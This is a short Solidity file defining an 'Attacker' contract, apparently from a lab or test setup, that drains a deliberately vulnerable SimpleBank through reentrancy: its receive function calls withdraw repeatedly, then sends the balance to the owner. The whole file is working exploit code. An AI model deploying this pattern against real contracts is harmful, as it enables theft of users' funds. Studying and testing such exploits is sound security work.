// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../contracts/Vulnerable.sol";

contract Attacker {
    SimpleBank public bank;
    address public owner;

    constructor(SimpleBank _bank) {
        bank = _bank;
        owner = msg.sender;
    }

    function attack(uint256 amount) external {
        bank.withdraw(amount);
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether); // re-enter
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }
}
